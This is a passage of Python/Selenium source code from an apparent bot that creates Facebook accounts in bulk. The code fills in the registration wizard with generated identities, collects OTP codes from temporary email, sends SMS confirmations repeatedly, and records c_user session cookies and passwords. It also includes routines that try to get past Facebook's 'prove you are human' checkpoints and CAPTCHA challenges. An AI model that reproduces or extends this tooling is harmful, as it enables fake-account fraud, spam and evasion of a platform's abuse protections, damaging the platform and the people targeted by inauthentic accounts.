                            print_stage_log(total, index, f"creation failed: {err_diag}", emoji="⚠️")
                            self._save_record_to_files(record)
                            if index < total:
                                print("🫯🌌 next task on progress ☄️")
                            return record
                    else:
                        if attempt < MAX_ATTEMPTS:
                            print_stage_log(total, index, f"[RETRY {attempt}/{MAX_ATTEMPTS}] No confirmation from Facebook. Retrying in 1.5s...", emoji="🔄")
                            await asyncio.sleep(1.5)
                            continue
                        else:
                            record["status"] = "CREATION FAILED (No Confirmation) ⚠️"
                            record["diagnostics"] = f"Submitted registration but Facebook did not route to OTP or issue session cookies after {MAX_ATTEMPTS} attempts (Silent drop / IP block)."
                            record["time_taken"] = round(time.time() - task_start, 2)
                            print_stage_log(total, index, f"creation failed: {record['diagnostics']}", emoji="⚠️")
                            self._save_record_to_files(record)
                            if index < total:
                                print("🫯🌌 next task on progress ☄️")
                            return record

                # If reached here: either c_user != "N/A" or landed_otp is True (SUCCESS)
                break

            # Staging Challenge Hook / CAPTCHA Detection
            if self._is_checkpoint(driver):
                print_stage_log(total, index, "Staging checkpoint / challenge screen encountered. Engaging resolver...", emoji="WARN")
                await self._resolve_staging_challenge_hook(driver, index)

            # Complete Creation Email Branch (if not 90% mode and not phone)
            if self.contact_mode == "email" and landed_otp:
                otp_timeout = 30 if self.mode == "instant" else 55
                otp = await temp_mail.poll_for_otp_async(timeout_sec=otp_timeout, event_bus=self.event_bus, account_idx=index)
                if otp:
                    record["otp"] = otp
                    await asyncio.to_thread(self._submit_otp_code, driver, otp)
                    await asyncio.sleep(1.0)
                    await asyncio.to_thread(self._sweep_popups, driver)
                else:
                    record["status"] = "FAILED (OTP Timeout)"
                    record["diagnostics"] = "Confirmation code was not received within timeout window."

            if landed_otp:
                if "phone" in self.contact_mode:
                    valid_sends, attempt_sends = await self._handle_phone_confirmation_and_resend(driver, contact_val, index, total)
                    record["resend_multiplier"] = self.resend_multiplier
                    record["valid_resends"] = valid_sends
                    record["attempt_resends"] = attempt_sends
                    if valid_sends > 1:
                        record["dispatches"] = f"{valid_sends}x"
                else:
                    print_stage_log(total, index, "otp input screen found")
                print_stage_log(total, index, "90% account creation done ✅")

            default_status = "90% DONE ✅ (Awaiting SMS OTP)" if "phone" in self.contact_mode else ("90% DONE ✅ (Awaiting Email OTP)" if is_90_email else "LIVE ✅")

            # ==================================================================
            # Post-Creation Credential Login Verification Test on limited.facebook.com
            # ==================================================================
            print_stage_log(total, index, "verify login on process 👾")
            login_status, login_diag = await self._perform_post_creation_login_test(driver, c_user, contact_val, password, total=total, index=index)

            print_stage_log(total, index, f"c_user: {record['c_user']} /phone {contact_val}")
            print_stage_log(total, index, f"password {password}")

            if login_status == "VALID_OTP":
                record["status"] = default_status
                record["diagnostics"] = f"Account verified. Post-creation login routed to OTP verification barrier ({login_diag})."
                print_stage_log(total, index, "verification successful (enter otp screen found)")
                print_stage_log(total, index, f"live check status: {record['status']}")
                print_stage_log(total, index, "logged to file details are:")
                render_account_card(record)
                self.created_count += 1

            elif login_status == "ACTIVE_FEED":
                record["status"] = "LIVE ✅"
                record["diagnostics"] = "Account verified. Post-creation login routed to active authenticated feed."
                print_stage_log(total, index, "verification successful (active feed reached)")
                print_stage_log(total, index, f"live check status: {record['status']}")
                print_stage_log(total, index, "logged to file details are:")
                render_account_card(record)
                self.created_count += 1

            elif login_status == "APPEALED":
                record["status"] = "APPEALED (Check Later) ⚠️"
                record["diagnostics"] = f"Human challenge appeal submitted ({login_diag})."
                print_stage_log(total, index, f"live check status: {record['status']}", emoji="⚠️")

            elif login_status == "FAILED":
                is_live = False
                v_msg = ""
                if record["c_user"] != "N/A":
                    is_live, v_msg = LivenessChecker.audit_c_user(record["c_user"])

                # If c_user was harvested during registration and Graph confirms live (or valid length UID):
                if is_live or (record["c_user"] != "N/A" and len(record["c_user"]) >= 10):
                    record["status"] = default_status
                    record["diagnostics"] = f"Account verified created with active c_user {record['c_user']} (Graph confirmed live: {v_msg}). Login test note: {login_diag}"
                    print_stage_log(total, index, f"verification successful (active c_user confirmed: {record['c_user']})")
                    print_stage_log(total, index, f"live check status: {record['status']}")
                    print_stage_log(total, index, "logged to file details are:")
                    render_account_card(record)
                    self.created_count += 1
                else:
                    record["status"] = "LOGIN TEST FAILED ⚠️"
                    record["diagnostics"] = f"⚠️ Login test failed on limited.facebook.com: {login_diag}"
                    print_stage_log(total, index, f"live check status: LOGIN TEST FAILED ({login_diag})", emoji="❌")

            # Final Graph Liveness Audit
            if record["c_user"] != "N/A":
                is_live, v_msg = LivenessChecker.audit_c_user(record["c_user"])
                if is_live and "FAILED" not in record["status"]:
                    record["status"] = "LIVE ✅" if "90%" not in record["status"] else record["status"]

            record["time_taken"] = round(time.time() - task_start, 2)
            self._save_record_to_files(record)
            if index < total:
                print("🫯🌌 next task on progress ☄️")
            return record

        except Exception as e:
            record["status"] = "FAILED (Exception)"
            record["diagnostics"] = str(e)[:120]
            record["time_taken"] = round(time.time() - task_start, 2)
            print_log_line("ERROR", f"Automation exception: {record['diagnostics']}", "ERROR")
            self._save_record_to_files(record)
            if index < total:
                print("🫯🌌 next task on progress ☄️")
            return record

        finally:
            if self.mode != "ultra":
                if driver:
                    try: await asyncio.to_thread(driver.quit)
                    except Exception: pass
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
                kill_zombie_browsers()

    async def _perform_post_creation_login_test(self, driver, c_user: str, contact_val: str, password: str, total: int = 1, index: int = 1) -> Tuple[str, str]:
        """
        Verify created account on https://limited.facebook.com:
        - Navigates to limited.facebook.com login form
        - Injects username (c_user if available, else contact_val) & password
        - Strictly handles "Save for later login" screen: ALWAYS clicks 'Not Now', NEVER clicks 'OK'
        - Returns (verdict_code, detail_message)
        """
        from selenium.webdriver.common.by import By

        try:
            # Clear cookies to force fresh login session safely without tripping CDP inspector
            try:
                driver.get("about:blank")
                await asyncio.sleep(0.3)
                driver.delete_all_cookies()
            except Exception:
                try:
                    driver.delete_all_cookies()
                except Exception:
                    pass

            try:
                await self._safe_navigate(driver, "https://limited.facebook.com")
                await asyncio.sleep(1.0)
            except Exception:
                try:
                    await self._safe_navigate(driver, "https://m.facebook.com")
                    await asyncio.sleep(1.0)
                except Exception:
                    pass

            # Check if login inputs are present
            inps = driver.find_elements(By.CSS_SELECTOR, "input[name='email'], input#m_login_email, input[type='text'], input[type='tel']")
            pwd_inps = driver.find_elements(By.CSS_SELECTOR, "input[name='pass'], input#m_login_password, input[type='password']")

            if not inps or not pwd_inps:
                # If landing page with login link, engage it
                for a in driver.find_elements(By.TAG_NAME, "a"):
                    if "log in" in (a.text or "").lower():
                        driver.execute_script("arguments[0].click();", a)
                        await asyncio.sleep(1.0)
                        break
                inps = driver.find_elements(By.CSS_SELECTOR, "input[name='email'], input#m_login_email, input[type='text'], input[type='tel']")
                pwd_inps = driver.find_elements(By.CSS_SELECTOR, "input[name='pass'], input#m_login_password, input[type='password']")

            if not inps or not pwd_inps:
                return "FAILED", "Could not locate login form inputs on limited.facebook.com"

            # Prefer the actual registered contact (phone/email) as the primary login identifier
            login_user = contact_val if (contact_val and contact_val != "N/A") else c_user
            email_field = inps[0]
            pass_field = pwd_inps[0]

            email_field.clear()
            email_field.send_keys(login_user)
            pass_field.clear()
            pass_field.send_keys(password)

            # Engage Log In button
            login_btn = driver.find_elements(By.CSS_SELECTOR, "button[name='login'], button[type='submit']")
            if login_btn:
                driver.execute_script("arguments[0].click();", login_btn[0])
            else:
                pass_field.submit()

            # Monitor for post-login screens (up to 10s)
            for _ in range(12):
                await asyncio.sleep(0.8)
                try:
                    body_txt = get_safe_body_text(driver).lower()
                    curr_url = get_safe_current_url(driver).lower()
                except Exception:
                    continue

                # Handle "Save for later login" / "Save your login info" screen
                if "save for later login" in body_txt or "save your login info" in body_txt or "save password" in body_txt:
                    print_stage_log(total, index, "Found Save login info for later")
                    not_now_clicked = False
                    for sel in [
                        "//button[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
                        "//div[@role='button'][contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
                        "//a[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
                        "//span[contains(translate(., 'NOT NOW', 'not now'), 'not now')]"
                    ]:
                        for el in driver.find_elements(By.XPATH, sel):
                            if el.is_displayed():
                                driver.execute_script("arguments[0].click();", el)
                                not_now_clicked = True
                                break
                        if not_now_clicked: break
                    if not_now_clicked:
                        print_stage_log(total, index, "clicked not now")
                    await asyncio.sleep(1.0)
                    continue

                # Condition 1: Landed on OTP verification screen
                if any(k in body_txt for k in ["enter the code", "confirmation code", "enter confirmation code", "we sent a text", "we sent an sms", "confirm your mobile", "confirm your phone"]):
                    return "VALID_OTP", "Landed on SMS/Email code verification screen"
                if any(k in curr_url for k in ["confirmemail.php", "checkpoint", "confirm_phone", "recover/code"]):
                    return "VALID_OTP", f"Routed to confirmation checkpoint ({curr_url})"

                # Condition 2: Landed on active Home Feed
                if any(c["name"] == "c_user" for c in driver.get_cookies()):
                    return "ACTIVE_FEED", "Session authenticated with active c_user"
                if any(k in curr_url for k in ["home.php", "feed", "welcome"]):
                    return "ACTIVE_FEED", f"Landed on authenticated feed ({curr_url})"

                # Condition 3: Landed on "Prove you are human" / Challenge
                if self._is_checkpoint(driver):
                    print_stage_log(total, index, "Login test hit 'Prove you are human' challenge. Attempting appeal...", emoji="WARN")
                    await self._resolve_staging_challenge_hook(driver, 1)
                    await asyncio.sleep(2.0)
                    body_after = get_safe_body_text(driver).lower()
                    if any(k in body_after for k in ["we received your information", "check back", "reviewing your information", "appealed"]):
                        return "APPEALED", "Photo appeal submitted successfully; awaiting review"
                    return "APPEALED", "Challenge hook executed on checkpoint"

                # Condition 4: Login error
                if any(k in body_txt for k in ["incorrect password", "login error", "isn't connected to an account", "find your account", "invalid username", "unable to log in", "unexpected error occurred", "don't find any accounts", "we don't find any", "couldn't find an account", "we couldn't find an account"]):
                    return "FAILED", "Invalid credentials, unexpected error, or account lookup failure"

            has_c_user = any(c["name"] == "c_user" for c in driver.get_cookies())
            if not has_c_user and not any(k in curr_url for k in ["confirmemail.php", "checkpoint", "confirm_phone"]):
                return "FAILED", "No active c_user cookie or session identity detected on limited.facebook.com"

            return "VALID_OTP", "Login test concluded without blocking barriers"

        except Exception as e:
            return "FAILED", f"Login test exception: {str(e)[:60]}"

    async def _safe_navigate(self, driver, url: str):
        """Resilient navigation recovering from renderer timeouts using window.stop()."""
        try:
            await asyncio.to_thread(driver.get, url)
        except Exception as e:
            err_str = str(e).lower()
            if "timeout" in err_str or "renderer" in err_str:
                write_runtime_log("WARN", "NAVIGATE", f"Renderer wait reached limit on {url} ({e}); halting subresources with window.stop()...")
                try:
                    driver.execute_script("window.stop();")
                except Exception:
                    pass
            else:
                write_runtime_log("ERROR", "NAVIGATE", f"Navigation exception for {url}: {e}")
                raise

    async def _wait_for_dom_ready(self, driver, max_checks: int = 35):
        for _ in range(max_checks):
            try:
                cnt = driver.execute_script("return document.querySelectorAll('input, button, a, form').length;")
                if cnt and cnt >= 2:
                    return
            except Exception:
                pass
            await asyncio.sleep(0.1)

    async def _fill_dob_step(self, driver, identity: Dict[str, Any]) -> bool:
        """Robustly set Date of Birth in multi-step wizard using JavaScript injection with fallback."""
        from selenium.webdriver.common.by import By
        day = str(identity.get("day", 15))
        month = str(identity.get("month", 5))
        year = str(identity.get("year", 1995))

        # Wait up to 8s for DOB container or elements to be present in DOM
        for _ in range(16):
            try:
                has_dob = driver.execute_script("""
                    return !!(document.querySelector('select[name="birthday_day"], select#day, select[name*="day" i], input[type="date"], input[name*="birthday" i]'));
                """)
                if has_dob:
                    break
            except Exception:
                pass
            await asyncio.sleep(0.5)

        # JavaScript injection to set select values or date inputs safely
        js_set = """
        let d = arguments[0];
        let m = arguments[1];
        let y = arguments[2];
        let success = false;

        function setSelectVal(el, val) {
            if (!el) return false;
            el.style.display = 'block';
            el.style.visibility = 'visible';
            el.style.opacity = '1';
            el.value = String(val);
            for (let opt of el.options) {
                if (opt.value == String(val) || opt.text.trim() == String(val) || opt.value == String(parseInt(val, 10))) {
                    opt.selected = true;
                    break;
                }
            }
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
            return true;
        }

        let daySel = document.querySelector('select[name="birthday_day"], select#day, select[name*="day" i]');
        let monthSel = document.querySelector('select[name="birthday_month"], select#month, select[name*="month" i]');
        let yearSel = document.querySelector('select[name="birthday_year"], select#year, select[name*="year" i]');

        if (daySel && monthSel && yearSel) {
            setSelectVal(daySel, d);
            setSelectVal(monthSel, m);
            setSelectVal(yearSel, y);
            success = true;
        }

        let dateInp = document.querySelector('input[type="date"], input[name*="birthday" i], input[name*="dob" i]');
        if (dateInp) {
            let padM = m.padStart(2, '0');
            let padD = d.padStart(2, '0');
            dateInp.value = `${y}-${padM}-${padD}`;
            dateInp.dispatchEvent(new Event('input', { bubbles: true }));
            dateInp.dispatchEvent(new Event('change', { bubbles: true }));
            success = true;
        }
        return success;
        """
        try:
            res = driver.execute_script(js_set, day, month, year)
            if res:
                write_runtime_log("SUCCESS", "DOM", f"Date of Birth set via JS: {identity.get('dob')}")
                return True
        except Exception as e:
            write_runtime_log("WARN", "DOM", f"JS DOB injection hit exception ({e}); trying fallback")

        # Fallback to standard Selenium element selection wrapped safely
        try:
            day_sels = driver.find_elements(By.NAME, "birthday_day")
            if day_sels:
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", day_sels[0])
                from selenium.webdriver.support.ui import Select
                try:
                    Select(day_sels[0]).select_by_value(str(day))
                    Select(driver.find_element(By.NAME, "birthday_month")).select_by_value(str(month))
                    Select(driver.find_element(By.NAME, "birthday_year")).select_by_value(str(year))
                except Exception:
                    pass
        except Exception:
            pass
        return True

    async def _execute_registration_state_machine(self, driver, identity: Dict[str, Any], contact: str, password: str) -> bool:
        """Adaptive State Machine executing either mobile multi-step wizard or desktop single-step form."""
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import Select

        # Ensure DOM has registration elements or wizard step 1
        has_reg_inputs = False
        for _wait in range(16):
            if (driver.find_elements(By.NAME, "firstname") or 
                driver.find_elements(By.NAME, "reg_email__") or 
                driver.find_elements(By.CSS_SELECTOR, "input[id*='firstname'], input[id*='email'], input[name*='name']")):
                has_reg_inputs = True
                break
            await asyncio.sleep(0.4)

        if not has_reg_inputs:
            # Fallback navigate to m.facebook.com/reg if elements did not appear
            curr_url = get_safe_current_url(driver).lower()
            if "/reg" not in curr_url and "r.php" not in curr_url:
                print_log_line("NAVIGATE", "Registration form not detected; forcing fallback to https://m.facebook.com/reg...", "ACTION")
                await self._safe_navigate(driver, "https://m.facebook.com/reg")
                await self._wait_for_dom_ready(driver)
                for _wait in range(16):
                    if (driver.find_elements(By.NAME, "firstname") or 
                        driver.find_elements(By.NAME, "reg_email__") or 
                        driver.find_elements(By.CSS_SELECTOR, "input[id*='firstname'], input[id*='email'], input[name*='name']")):
                        has_reg_inputs = True
                        break
                    await asyncio.sleep(0.4)

        # Check if limited edition multi-step wizard is present
        fn_inputs = driver.find_elements(By.NAME, "firstname") or driver.find_elements(By.CSS_SELECTOR, "input[id*='firstname']")
        pwd_inputs = driver.find_elements(By.NAME, "reg_passwd__") or driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
        dob_selects = driver.find_elements(By.NAME, "birthday_day")

        is_multistep = False
        if fn_inputs and any(fn.is_displayed() for fn in fn_inputs):
            # In multi-step wizard, password is not present on step 1, or birthday dropdowns are hidden/absent, or Next button is present
            if not pwd_inputs or not any(p.is_displayed() for p in pwd_inputs):
                is_multistep = True
            elif len(dob_selects) > 0 and not dob_selects[0].is_displayed():
                is_multistep = True
            elif driver.find_elements(By.XPATH, "//button[contains(translate(., 'NEXT', 'next'), 'next')] | //div[@role='button'][contains(translate(., 'NEXT', 'next'), 'next')]"):
                is_multistep = True

        if is_multistep:
            print_log_line("DOM", "Detected Limited Edition Multi-Step Wizard. Executing Step 1 (Names)...", "ACTION")
            # Step 1: Names - Robust React & DOM Injection with verification
            for _name_attempt in range(3):
                fn_inputs = driver.find_elements(By.NAME, "firstname") or driver.find_elements(By.CSS_SELECTOR, "input[id*='firstname'], input[name*='first']")
                ln_inputs = driver.find_elements(By.NAME, "lastname") or driver.find_elements(By.CSS_SELECTOR, "input[id*='lastname'], input[name*='last']")
                if fn_inputs:
                    try:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].focus();", fn_inputs[0])
                        fn_inputs[0].clear()
                        fn_inputs[0].send_keys(identity["first_name"])
                    except Exception:
                        pass
                if ln_inputs:
                    try:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].focus();", ln_inputs[0])
                        ln_inputs[0].clear()
                        ln_inputs[0].send_keys(identity["last_name"])
                    except Exception:
                        pass

                # Synthetic React prototype value setter to guarantee internal state synchronization
                driver.execute_script("""
                    function setInputVal(el, val) {
                        if (!el) return;
                        var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                        if (setter) { setter.call(el, val); } else { el.value = val; }
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                    var fn = document.querySelector('input[name="firstname"], input#firstname_input, input[id*="firstname"], input[name*="first"]');
                    var ln = document.querySelector('input[name="lastname"], input#lastname_input, input[id*="lastname"], input[name*="last"]');
                    if (fn && (!fn.value || fn.value !== arguments[0])) setInputVal(fn, arguments[0]);
                    if (ln && (!ln.value || ln.value !== arguments[1])) setInputVal(ln, arguments[1]);
                """, identity["first_name"], identity["last_name"])

                await self._click_wizard_next(driver)
                await asyncio.sleep(0.6)

                # Check if Step 1 transitioned away or if still showing first name field
                still_fn = driver.find_elements(By.NAME, "firstname")
                if not (still_fn and any(f.is_displayed() for f in still_fn)):
                    break

            # Step 2: Date of Birth
            print_log_line("DOM", f"Executing Step 2: Date of Birth ({identity['dob']})...", "ACTION")
            await self._fill_dob_step(driver, identity)
            await self._click_wizard_next(driver)

            # Step 3: Contact Point
            print_log_line("DOM", f"Executing Step 3: Injecting Contact Point ({contact})...", "ACTION")
            for _cp_poll in range(12):
                cp_inputs = driver.find_elements(By.NAME, "reg_email__") or driver.find_elements(By.CSS_SELECTOR, "input[type='tel'], input[name='contactpoint'], input[name*='phone'], input[name*='email'], input[id*='contact']")
                if cp_inputs:
                    cp = cp_inputs[0]
                    try:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].focus();", cp)
                        cp.clear()
                        cp.send_keys(contact)
                    except Exception:
                        pass
                    val_in = driver.execute_script("return arguments[0].value;", cp)
                    if val_in != contact:
                        driver.execute_script("""
                            var el = arguments[0];
                            var val = arguments[1];
                            var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                            if (setter) { setter.call(el, val); } else { el.value = val; }
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                            el.dispatchEvent(new Event('change', { bubbles: true }));
                        """, cp, contact)
                    break
                await asyncio.sleep(0.3)
            await self._click_wizard_next(driver)
            await asyncio.sleep(0.6)

            # Check for instant phone rejection by Facebook
            body_check = get_safe_body_text(driver).lower()
            invalid_errs = ["valid mobile number", "valid phone number", "enter a valid phone", "number you entered is invalid", "invalid number", "we couldn't create an account"]
            # If rejected with '+' and contact starts with '+', retry with country code but without '+' icon
            if any(err in body_check for err in invalid_errs) and contact.startswith("+"):
                alt_contact = contact.lstrip("+")
                print_log_line("DOM", f"Facebook rejected '{contact}' with '+'; retrying with '{alt_contact}' (retaining country code)...", "WARN")
                cp_inputs = driver.find_elements(By.NAME, "reg_email__") or driver.find_elements(By.CSS_SELECTOR, "input[type='tel'], input[name='contactpoint'], input[name*='phone'], input[name*='email'], input[id*='contact']")
                if cp_inputs:
                    driver.execute_script("""
                        var el = arguments[0];
                        var val = arguments[1];
                        var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                        if (setter) { setter.call(el, val); } else { el.value = val; }
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                    """, cp_inputs[0], alt_contact)
                    await self._click_wizard_next(driver)
                    await asyncio.sleep(0.6)
                    body_check = get_safe_body_text(driver).lower()
                    if not any(err in body_check for err in invalid_errs):
                        contact = alt_contact

            if any(err in body_check for err in invalid_errs):
                print_log_line("DOM", f"Facebook rejected contact as invalid: {contact}", "WARN")
                return "INVALID_PHONE"

            # Step 4: Gender
            print_log_line("DOM", f"Executing Step 4: Selecting Gender ({identity['gender']})...", "ACTION")
            g_val = "1" if identity["gender"].lower() == "female" else "2"
            for _g_poll in range(12):
                radios = driver.find_elements(By.XPATH, f"//input[@name='sex'][@value='{g_val}']")
                if radios:
                    try:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].checked = true; arguments[0].click();", radios[0])
                        break
                    except Exception:
                        pass
                await asyncio.sleep(0.3)
            await self._click_wizard_next(driver)

            # Step 5: Password & Sign Up Submit
            print_log_line("DOM", "Executing Step 5: Setting Password & Dispatching Registration...", "ACTION")
            for _pwd_poll in range(12):
                pwd_inputs = driver.find_elements(By.NAME, "reg_passwd__") or driver.find_elements(By.CSS_SELECTOR, "input[type='password'], input[name*='pass']")
                if pwd_inputs:
                    p_in = pwd_inputs[0]
                    try:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].focus();", p_in)
                        p_in.clear()
                        p_in.send_keys(password)
                    except Exception:
                        pass
                    p_val = driver.execute_script("return arguments[0].value;", p_in)
                    if p_val != password:
                        driver.execute_script("""
                            var el = arguments[0];
                            var val = arguments[1];
                            var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                            if (setter) { setter.call(el, val); } else { el.value = val; }
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                            el.dispatchEvent(new Event('change', { bubbles: true }));
                        """, p_in, password)
                    break
                await asyncio.sleep(0.3)

            # Click Step 5 Next / Submit button
            clicked_step5 = False
            step5_selectors = [
                "//button[contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]",
                "//button[@name='submit']",
                "//input[@type='submit']",
                "//button[@name='websubmit']",
                "//button[contains(translate(., 'NEXT', 'next'), 'next')]",
                "//div[@role='button'][contains(translate(., 'NEXT', 'next'), 'next')]",
                "//button[@type='submit']",
                "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue')]"
            ]
            for sel in step5_selectors:
                btns = driver.find_elements(By.XPATH, sel)
                if btns and any(b.is_displayed() for b in btns):
                    target_b = next(b for b in btns if b.is_displayed())
                    try:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", target_b)
                        driver.execute_script("arguments[0].click();", target_b)
                        clicked_step5 = True
                        break
                    except Exception:
                        pass
            if not clicked_step5:
                clicked_step5 = await self._click_wizard_next(driver)

            print_log_line("DOM", "Dispatched Step 5 submit trigger.", "SUCCESS")

            # Step 6: Multi-Step Terms & Policy Agreement Confirmation
            # Detect whether Facebook routes to 'Finish signing up' / 'Agree to Facebook terms' / 'No, create new account'
            for _wait_step6 in range(12):
                await asyncio.sleep(0.4)
                try:
                    # If cookies already landed or routed directly to OTP, complete state machine
                    if any(c.get("name") == "c_user" for c in driver.get_cookies()):
                        break
                    url_s6 = get_safe_current_url(driver).lower()
                    body_s6 = get_safe_body_text(driver).lower()
                    if any(k in url_s6 for k in ["confirmemail.php", "checkpoint", "confirm_phone", "recover/code"]):
                        break
                    if any(k in body_s6 for k in ["enter the code", "confirmation code", "enter confirmation code", "we sent a text", "we sent an sms"]):
                        break

                    # Check for "Already have an account?" prompt -> click "No, create new account"
                    no_acc_btns = driver.find_elements(By.XPATH, "//button[contains(translate(., 'NO, CREATE NEW ACCOUNT', 'no, create new account'), 'no, create new account')] | //div[@role='button'][contains(translate(., 'NO, CREATE NEW ACCOUNT', 'no, create new account'), 'no, create new account')] | //a[contains(translate(., 'NO, CREATE NEW ACCOUNT', 'no, create new account'), 'no, create new account')]")
                    if no_acc_btns and any(b.is_displayed() for b in no_acc_btns):
                        b_target = next(b for b in no_acc_btns if b.is_displayed())
                        driver.execute_script("arguments[0].click();", b_target)
                        print_log_line("DOM", "Clicked 'No, create new account' dialog.", "ACTION")
                        await asyncio.sleep(0.8)
                        continue

                    # Check for Step 6 "I agree" / "Sign Up" / "Agree" / "Finish signing up"
                    agree_selectors = [
                        "//button[contains(translate(., 'I AGREE', 'i agree'), 'i agree')]",
                        "//div[@role='button'][contains(translate(., 'I AGREE', 'i agree'), 'i agree')]",
                        "//button[contains(translate(., 'AGREE', 'agree'), 'agree')]",
                        "//div[@role='button'][contains(translate(., 'AGREE', 'agree'), 'agree')]",
                        "//button[contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]",
                        "//div[@role='button'][contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]",
                        "//button[contains(translate(., 'FINISH SIGNING UP', 'finish signing up'), 'finish signing up')]",
                        "//button[contains(translate(., 'CREATE ACCOUNT', 'create account'), 'create account')]",
                        "//input[@type='submit'][contains(translate(@value, 'SIGN UP', 'sign up'), 'sign up')]"
                    ]
                    agree_clicked = False
                    for a_sel in agree_selectors:
                        a_btns = driver.find_elements(By.XPATH, a_sel)
                        if a_btns and any(b.is_displayed() for b in a_btns):
                            target_a = next(b for b in a_btns if b.is_displayed())
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", target_a)
                            driver.execute_script("arguments[0].click();", target_a)
                            print_log_line("DOM", "Dispatched Step 6 Terms & Agreement trigger ('I agree' / 'Sign Up').", "SUCCESS")
                            agree_clicked = True
                            break
                    if agree_clicked:
                        await asyncio.sleep(0.8)
                        break
                except Exception:
                    pass

            return True

        # Desktop Single-Step / Fallback Form Execution
        print_log_line("DOM", "Executing standard single-step registration form fill...", "ACTION")
        if self.mode in ("instant", "ultra"):
            sub_res = driver.execute_script('''
                let identity = arguments[0];
                let contact = arguments[1];
                let password = arguments[2];

                function setVal(input, val) {
                    if (!input) return;
                    let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
                    if (setter) setter.call(input, val);
                    else input.value = val;
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    input.dispatchEvent(new Event('change', { bubbles: true }));
                }

                setVal(document.querySelector('input[name="firstname"], input#firstname_input, input[id*="firstname"]'), identity.first_name);
                setVal(document.querySelector('input[name="lastname"], input#lastname_input, input[id*="lastname"]'), identity.last_name);
                setVal(document.querySelector('input[name="reg_email__"], input#reg_email__, input[name*="email"]'), contact);
                setVal(document.querySelector('input[name="reg_passwd__"], input#reg_passwd__, input[name*="password"], input[type="password"]'), password);

                let daySel = document.querySelector('select[name="birthday_day"], select#day, select[name*="day" i]');
                let monthSel = document.querySelector('select[name="birthday_month"], select#month, select[name*="month" i]');
                let yearSel = document.querySelector('select[name="birthday_year"], select#year, select[name*="year" i]');
                if (daySel) { daySel.value = String(identity.day); daySel.dispatchEvent(new Event('change', { bubbles: true })); }
                if (monthSel) { monthSel.value = String(identity.month); monthSel.dispatchEvent(new Event('change', { bubbles: true })); }
                if (yearSel) { yearSel.value = String(identity.year); yearSel.dispatchEvent(new Event('change', { bubbles: true })); }

                let dateInp = document.querySelector('input[type="date"], input[name*="birthday" i]');
                if (dateInp) {
                    let padM = String(identity.month).padStart(2, '0');
                    let padD = String(identity.day).padStart(2, '0');
                    dateInp.value = `${identity.year}-${padM}-${padD}`;
                    dateInp.dispatchEvent(new Event('input', { bubbles: true }));
                    dateInp.dispatchEvent(new Event('change', { bubbles: true }));
                }

                let gVal = (identity.gender.toLowerCase() === 'female') ? '1' : '2';
                let sexRadio = document.querySelector(`input[name="sex"][value="${gVal}"]`) || document.querySelector(`input[type="radio"][value="${gVal}"]`);
                if (sexRadio) sexRadio.click();

                let submitBtn = Array.from(document.querySelectorAll('button[name="websubmit"], button[type="submit"], button[name="submit"], input[type="submit"], button[data-sigil="touchable_button"]')).find(b => b.offsetParent !== null);
                if (submitBtn) { submitBtn.click(); return 'submitted'; }
                return 'pending';
            ''', identity, contact, password)
            return True

        else:
            inputs = driver.find_elements(By.CSS_SELECTOR, "input[name='firstname'], input[name='lastname'], input[name='reg_email__'], input[name='reg_passwd__']")
            type_delay = 0.005 if self.mode == "fast" else 0.035
            for inp, val in zip(inputs, [identity["first_name"], identity["last_name"], contact, password]):
                inp.clear()
                for ch in val:
                    inp.send_keys(ch)
                    await asyncio.sleep(type_delay)

            # Combobox / Selects
            day_sels = driver.find_elements(By.NAME, "birthday_day")
            if day_sels:
                Select(day_sels[0]).select_by_value(str(identity["day"]))
                Select(driver.find_element(By.NAME, "birthday_month")).select_by_value(str(identity["month"]))
                Select(driver.find_element(By.NAME, "birthday_year")).select_by_value(str(identity["year"]))

            g_val = "1" if identity["gender"].lower() == "female" else "2"
            radios = driver.find_elements(By.XPATH, f"//input[@name='sex'][@value='{g_val}']")
            if radios: driver.execute_script("arguments[0].click();", radios[0])

            sub_btns = driver.find_elements(By.XPATH, "//button[@name='websubmit'] | //button[@type='submit'] | //button[@name='submit'] | //input[@type='submit'] | //button[contains(translate(., 'SIGN UP', 'sign up'), 'sign up')]")
            if sub_btns:
                driver.execute_script("arguments[0].click();", sub_btns[0])
                return True
            return False

    async def _click_wizard_next(self, driver):
        from selenium.webdriver.common.by import By
        clicked = False
        selectors = [
            "//button[contains(translate(., 'NEXT', 'next'), 'next')]",
            "//div[@role='button'][contains(translate(., 'NEXT', 'next'), 'next')]",
            "//input[@type='submit'][contains(translate(@value, 'NEXT', 'next'), 'next')]",
            "//button[contains(translate(., 'CONTINUE', 'continue'), 'continue')]",
